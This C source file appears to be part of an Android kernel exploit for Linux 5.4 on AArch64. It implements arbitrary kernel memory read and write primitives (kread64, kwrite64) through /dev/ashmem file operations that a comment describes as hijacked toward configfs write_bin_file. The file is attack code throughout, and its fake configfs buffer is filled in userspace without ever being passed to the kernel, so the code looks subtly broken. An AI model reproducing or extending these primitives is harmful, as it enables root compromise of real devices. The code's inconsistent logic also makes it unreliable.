#define _GNU_SOURCE
#include "target.h"
#include "common.h"
#include <sys/ioctl.h>
#include <linux/ashmem.h>
#include <unistd.h>
#include <fcntl.h>

#ifndef ASHMEM_NAME_LEN
#define ASHMEM_NAME_LEN 256
#endif

static int g_ashmem_fd = -1;

/* Configfs buffer structure for Linux 5.4 AArch64 */
struct configfs_buffer_54 {
    char pad[CFG_MUTEX_OFF];
    uint8_t mutex[32];
    uint8_t read_in_progress;
    uint8_t write_in_progress;
    uint16_t pad2;
    uint64_t bin_buffer;
    int32_t  bin_buffer_size;
    int32_t  cb_max_size;
};

static struct configfs_buffer_54 g_cfg_buf;

int pipe_rw_init(void) {
    if (g_ashmem_fd >= 0) return 0;
    
    g_ashmem_fd = open("/dev/ashmem", O_RDWR);
    if (g_ashmem_fd < 0) {
        printf("[pipe] open(/dev/ashmem) failed errno=%d\n", errno);
        return -1;
    }
    printf("[pipe] configfs virtual channel ashmem fd=%d opened\n", g_ashmem_fd);
    return 0;
}

int kwrite64(uint64_t addr, uint64_t val) {
    if (g_ashmem_fd < 0 && pipe_rw_init() < 0) return -1;

    memset(&g_cfg_buf, 0, sizeof(g_cfg_buf));
    g_cfg_buf.bin_buffer = addr;
    g_cfg_buf.bin_buffer_size = sizeof(uint64_t);
    g_cfg_buf.cb_max_size = sizeof(uint64_t);

    /* Use pwrite via hijacked f_op write_bin_file */
    ssize_t w = pwrite(g_ashmem_fd, &val, sizeof(uint64_t), 0);
    return (w == (ssize_t)sizeof(uint64_t)) ? 0 : -1;
}

int kread64(uint64_t addr, uint64_t *out) {
    if (g_ashmem_fd < 0 && pipe_rw_init() < 0) return -1;
    if (!out) return -1;

    memset(&g_cfg_buf, 0, sizeof(g_cfg_buf));
    g_cfg_buf.bin_buffer = addr;
    g_cfg_buf.bin_buffer_size = sizeof(uint64_t);

    ssize_t r = pread(g_ashmem_fd, out, sizeof(uint64_t), 0);
    return (r == (ssize_t)sizeof(uint64_t)) ? 0 : -1;
}
